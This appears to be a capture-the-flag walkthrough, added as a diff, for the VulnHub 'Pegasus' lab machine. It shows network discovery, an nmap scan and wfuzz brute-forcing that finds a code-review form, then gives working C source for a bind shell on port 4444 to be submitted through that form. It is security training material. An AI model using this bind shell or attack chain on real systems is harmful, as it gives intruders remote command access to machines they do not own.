@@ -1,0 +1,184 @@
+URL : https://www.vulnhub.com/entry/pegasus-1,109/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover
+ Currently scanning: 192.168.17.0/16   |   Screen View: Unique Hosts
+
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor
+ -----------------------------------------------------------------------------
+ 192.168.0.1     c4:a8:1d:2e:2d:1c    01    060   Unknown vendor
+ 192.168.0.5     00:0c:29:57:54:7e    01    060   VMware, Inc.
+ 192.168.0.6     40:f0:2f:57:6c:13    01    060   Unknown vendor
+
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.0.5
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-27 22:45 PDT
+Nmap scan report for 192.168.0.5
+Host is up (0.00079s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 77:89:5b:52:ed:a5:58:6e:8e:09:f3:9e:f1:b0:d9:98 (DSA)
+|   2048 d6:62:f5:12:31:36:ed:08:2c:1a:5e:9f:3c:aa:1f:d2 (RSA)
+|_  256 c5:f0:be:e5:c0:9c:28:6e:23:5c:48:38:8b:4a:c4:43 (ECDSA)
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          37749/udp  status
+|_  100024  1          43130/tcp  status
+8088/tcp  open  http    nginx 1.1.19
+|_http-methods: No Allow or Public header in OPTIONS response (status code 405)
+|_http-title: Pegasus Technologies - Under Construction
+43130/tcp open  status  1 (RPC #100024)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          37749/udp  status
+|_  100024  1          43130/tcp  status
+MAC Address: 00:0C:29:57:54:7E (VMware)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.79 ms 192.168.0.5
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.58 seconds
+
+3.) Testing the HTTP service running on 8088
+http://192.168.0.5:8088/
+root@kali:~# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hc 404 http://192.168.05:8088/FUZZ
+
+********************************************************
+* Wfuzz  2.0 - The Web Bruteforcer                     *
+********************************************************
+
+Target: http://192.168.05:8088/FUZZ
+Payload type: file,/usr/share/wfuzz/wordlist/general/megabeast.txt
+
+Total requests: 45463
+==================================================================
+ID      Response   Lines      Word         Chars          Request
+==================================================================
+
+00001:  C=200      9 L        18 W          189 Ch        " - admin"
+00002:  C=200      9 L        18 W          189 Ch        " - bak"
+00003:  C=200      9 L        18 W          189 Ch        " - Admin"
+00004:  C=200      9 L        18 W          189 Ch        " - Backup"
+00005:  C=200      9 L        18 W          189 Ch        " - warez"
+00006:  C=200      9 L        18 W          189 Ch        " - pr0n"
+00007:  C=200      9 L        18 W          189 Ch        " - Scripts"
+00008:  C=200      9 L        18 W          189 Ch        " - porn"
+00010:  C=200      9 L        18 W          189 Ch        " - IISSamples"
+00009:  C=200      9 L        18 W          189 Ch        " - IISHelp"
+00011:  C=200      9 L        18 W          189 Ch        " - IISAdmin"
+00012:  C=200      9 L        18 W          189 Ch        " - MSADC"
+00013:  C=200      9 L        18 W          189 Ch        " - PBServer"
+00014:  C=200      9 L        18 W          189 Ch        " - _vti_bin"
+
+
+Every request comes back with a 200 OK response
+This shows that it returns the same image for every request
+Fuzz for resources with the extension php
+root@kali:~# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hc 404 http://192.168.05:8088/FUZZ.php
+
+********************************************************
+* Wfuzz  2.0 - The Web Bruteforcer                     *
+********************************************************
+
+Target: http://192.168.05:8088/FUZZ.php
+Payload type: file,/usr/share/wfuzz/wordlist/general/megabeast.txt
+
+Total requests: 45463
+==================================================================
+ID      Response   Lines      Word         Chars          Request
+==================================================================
+
+39946:  C=200      0 L         4 W           19 Ch        " - submit"
+
+Now try access the page
+http://192.168.0.5:8088/submit.php
+Page says "No data to process."
+
+Trying a different wordlist
+root@kali:~# wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.05:8088/FUZZ.php
+
+********************************************************
+* Wfuzz  2.0 - The Web Bruteforcer                     *
+********************************************************
+
+Target: http://192.168.05:8088/FUZZ.php
+Payload type: file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+Total requests: 220560
+==================================================================
+ID      Response   Lines      Word         Chars          Request
+==================================================================
+
+89252:  C=200     14 L        58 W          488 Ch        " - codereview"
+
+Now try access the page
+http://192.168.0.5:8088/codereview.php
+Page Source:
+<html>
+	<head>
+		<title>Pegasus Technologies - Code Review</title>
+	</head>
+	<body>
+		<h1>Code review</h1>
+		<p>Note: our trainee (Mike) will be reviewing the code until we come up with an official process and a proper portal for code submission.</p>
+		<p>In the meantime, please use the form below.</p>
+		<form action="submit.php" method="post">
+			<textarea name="code" id="textarea" cols=60 rows=30></textarea><br/>
+			<input type="submit" value="Submit" />
+		</form>
+	</body>
+</html>
+Looking into the source code we can see that this page finally submits the POST data to submit.php
+
+Now submit a bind shell
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+
+int main(void)
+{
+        int clientfd, sockfd;
+        int dstport = 4444;
+        int o = 1;
+        struct sockaddr_in mysockaddr;
+
+        sockfd = socket(AF_INET, SOCK_STREAM, 0);
+        //setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &o, sizeof(o)); //a luxury we don't have space for
+
+        mysockaddr.sin_family = AF_INET; //2
+        mysockaddr.sin_port = htons(dstport);
+        mysockaddr.sin_addr.s_addr = INADDR_ANY; //0
+
+        bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));
+
+        listen(sockfd, 0);
+
+        clientfd = accept(sockfd, NULL, NULL);
+
+        dup2(clientfd, 0);
+        dup2(clientfd, 1);
+        dup2(clientfd, 2);
+
+        execve("/bin/sh", NULL, NULL);
+        return 0;
+}
